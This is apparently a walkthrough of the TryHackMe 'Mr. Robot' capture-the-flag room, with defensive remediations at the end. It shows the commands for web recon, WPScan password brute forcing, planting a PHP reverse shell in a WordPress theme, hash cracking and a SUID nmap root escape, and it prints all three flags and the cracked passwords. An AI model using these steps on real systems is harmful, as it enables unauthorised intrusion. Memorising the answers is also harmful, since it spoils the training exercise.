---
title: "TryHackMe: Mr. Robot CTF — Web Recon, Dictionary Pruning & SUID Escapes"
author: parthpandey
categories: [TryHackMe, Walkthroughs]
tags: [linux, web, ctf, robots-txt, wpscan, hydra, privilege-escalation, suid, nmap]
render_with_liquid: false
---

**Mr. Robot** is a widely acclaimed medium-difficulty Linux CTF based on the hit television series. It provides a textbook multi-stage attack chain: unearthing hidden resources in `robots.txt`, dealing with a massive wordlist using standard Unix text filtering, brute-forcing a WordPress administrative panel, weaponizing theme templates for web shell execution, and finally escalating privileges via misconfigured SUID binaries.

---

## Room Overview

| Detail | Value |
|---|---|
| **Platform** | TryHackMe |
| **Room Link** | [Mr. Robot](https://tryhackme.com/room/mrrobot) |
| **Difficulty** | Medium |
| **Target OS** | Linux |
| **Key Concepts** | Web Recon, Wordlist Deduplication, WordPress Exploitation, SUID Shell Escape |

---

## 1. Initial Reconnaissance & Discovery

We begin by scanning open ports using Nmap:

```console
$ nmap -sC -sV -p- -T4 10.10.X.X
```

### Scan Findings
- **Port 80 (HTTP)**: Apache web server hosting an interactive Mr. Robot terminal interface.
- **Port 443 (HTTPS)**: SSL enabled web service.

Checking `robots.txt` (`http://10.10.X.X/robots.txt`) revealed two critical entries:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Retrieving **Key 1**:
```console
$ curl -s http://10.10.X.X/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

---

## 2. Wordlist Pruning & WordPress Brute Force

The dictionary file `fsocity.dic` contained **858,160 lines**. Passing this raw file directly into Hydra or WPScan causes extreme lag, connection throttling, or server timeouts.

Inspecting and deduplicating the list:
```console
$ curl -s http://10.10.X.X/fsocity.dic > fsocity.dic
$ sort -u fsocity.dic -o fsocity_clean.dic
$ wc -l fsocity_clean.dic
11451 fsocity_clean.dic
```
Deduplication pruned the wordlist by **98.6%**, leaving only 11,451 unique entries.

Navigating to `http://10.10.X.X/wp-login.php`, error response analysis confirmed the existence of username `elliot`. We brute force the password:

```console
$ wpscan --url http://10.10.X.X -U elliot -P fsocity_clean.dic
```

WPScan discovered the valid credential in under 3 minutes:
- **Username**: `elliot`
- **Password**: `ER28-0652`

---

## 3. Weaponizing WordPress Themes (Initial Access)

1. Authenticated to the WordPress dashboard as `elliot`.
2. Navigated to **Appearance -> Editor -> 404 Template (`404.php`)**.
3. Injected a PHP reverse shell payload and saved the file.
4. Set up a local Netcat listener:
   ```console
   $ nc -lvnp 4444
   ```
5. Triggered the payload by curling `http://10.10.X.X/wp-content/themes/twentyfifteen/404.php`.
6. Caught initial shell as `daemon`.

---

## 4. Lateral Movement to User `robot`

In `/home/robot`, we find:
- `key-2-of-3.txt` (read-restricted to `robot`)
- `password.raw-md5` (`robot:c3fcd3d76192e4007dfb496cca67e13b`)

Cracking the raw MD5 hash:
```console
$ john --format=raw-md5 password.raw-md5
abcdefghijklmnopqrstuvwxyz (robot)
```

To switch users without terminal hang, we stabilize the shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su - robot
# Enter password: abcdefghijklmnopqrstuvwxyz
```

Retrieving **Key 2**:
```console
robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

---

## 5. Privilege Escalation to Root via SUID Nmap

We search for binaries with the SUID bit set:
```console
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
```

Notable finding:
```
/usr/local/bin/nmap
```

Older versions of Nmap (< 5.21) support `--interactive` mode, allowing users to spawn a shell breakout that inherits the binary's root SUID owner:

```console
robot@linux:~$ /usr/local/bin/nmap --interactive
nmap> !sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieving **Key 3**:
```console
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21f00f096
```

---

## Defensive Remediations

1. **Wordlist / Sensitive File Exposure**: Never host sensitive credential dictionaries or system artifacts in publicly accessible web directories or reference them in `robots.txt`.
2. **WordPress Hardening**: Disable theme and plugin file editing via `DISALLOW_FILE_EDIT` in `wp-config.php`.
3. **SUID Auditing**: Regularly inspect binaries with SUID bits set. Ensure tools like Nmap, vim, or find do not carry elevated execution flags.
